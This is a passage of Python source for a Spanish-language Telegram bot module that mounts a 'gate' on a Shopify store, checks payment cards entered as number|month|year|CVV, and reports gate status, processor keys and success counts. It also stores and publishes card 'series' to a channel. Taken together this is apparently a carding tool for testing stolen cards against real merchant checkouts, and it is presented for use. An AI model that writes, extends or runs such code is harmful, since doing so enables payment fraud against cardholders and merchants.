                await message.reply_text(f"🔧 ERROR EN VALIDACIÓN\n\nDetalles: {str(exc)[:150]}")

    async def mish(update, context):
        """Handler /mish — Estado del gate activo."""
        message = getattr(update, "effective_message", None)
        if message is None:
            return

        if not shopify_gate.current_gate:
            await message.reply_text(
                "🔍 ESTADO DEL GATE\n\n"
                "❌ NO HAY GATE MONTADO\n\n"
                "💡 Usa /tienda <URL> para analizar\n"
                "   Usa /shop <URL> para montar gate"
            )
            return

        cfg = shopify_gate.gate_config
        gate_display = (shopify_gate.current_gate[:60] + "...") if len(shopify_gate.current_gate) > 60 else shopify_gate.current_gate
        lines = [
            "🔍 ESTADO GATE AUTO SHOPIFY", "",
            "✅ GATE ACTIVO",
            f"🌐 URL: {gate_display}",
            f"🌍 País: {cfg.get('country', 'N/A')}",
            f"⏱️ Carga: {cfg.get('load_time', 0):.2f}s",
            f"💳 Procesador: {cfg.get('processor', 'UNKNOWN')}",
            f"🔑 Claves pk_: {len(cfg.get('public_keys', []))}",
            "",
        ]
        u = cfg.get("user_data", {})
        if u:
            lines += [
                "👤 DATOS CONFIGURADOS:",
                f"• Nombre: {u.get('name', 'N/A')}",
                f"• Ciudad: {u.get('city', 'N/A')}",
                f"• Moneda: {u.get('currency', 'N/A')}",
                "",
            ]
        stats = shopify_gate.request_stats
        lines += [
            "📊 ESTADÍSTICAS:",
            f"• Peticiones: {stats['total_requests']}",
            f"• Exitosas: {stats['successful_requests']}",
            f"• Fallidas: {stats['failed_requests']}",
            "",
            "🚀 COMANDOS:",
            "• /sh <número|mes|año|cvv> — Validar",
            "• /shop <URL> — Cambiar gate",
            "• /tienda <URL> — Analizar tienda",
        ]
        await message.reply_text("\n".join(lines))

    async def gen(update, context):
        """Handler /gen — Guarda texto de serie."""
        message = getattr(update, "effective_message", None)
        if not message or not message.text:
            return
        texto = shopify_gate.series_manager.extract_gen_text(message.text)
        if not texto:
            await message.reply_text("⚠️ Usa el formato: /gen texto")
            return
        shopify_gate.series_manager.save_series_text(texto)
        await message.reply_text(
            "✅ SERIE GUARDADA\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 Texto: {texto[:100]}{'...' if len(texto) > 100 else ''}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "💾 Almacenada en base de datos\n"
            "📤 Usa /series para publicar"
        )

    async def series(update, context):
        """Handler /series — Publica siguiente serie."""
        message = getattr(update, "effective_message", None)
        if message is None:
            return
        rows = shopify_gate.series_manager.get_next_unpublished_series(limit=1)
        if not rows:
            await message.reply_text("📭 No hay series pendientes por publicar")
            return
        series_id, texto = rows[0]
        try:
            sent = await message.reply_text(
                "🏛️ ALFA-1 - SERIES\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📋 Serie: <code>{texto}</code>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🔥 @MrMxyzptlk04\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
            )
            shopify_gate.series_manager.mark_series_as_published(series_id, sent.message_id)
            await message.reply_text(f"✅ Serie publicada (ID: {series_id})")
        except Exception as exc:
            await message.reply_text(f"❌ ERROR PUBLICANDO SERIE\n\n🔧 {str(exc)[:200]}")

    alfa_context.register_command("/tienda", tienda)
    alfa_context.register_command("/shop", shop)
    alfa_context.register_command("/sh", sh)
    alfa_context.register_command("/mish", mish)
    alfa_context.register_command("/gen", gen)
    alfa_context.register_command("/series", series)

    alfa_context.logger.info("auto_shopify_module registrado — 6 comandos, Browserless habilitado")
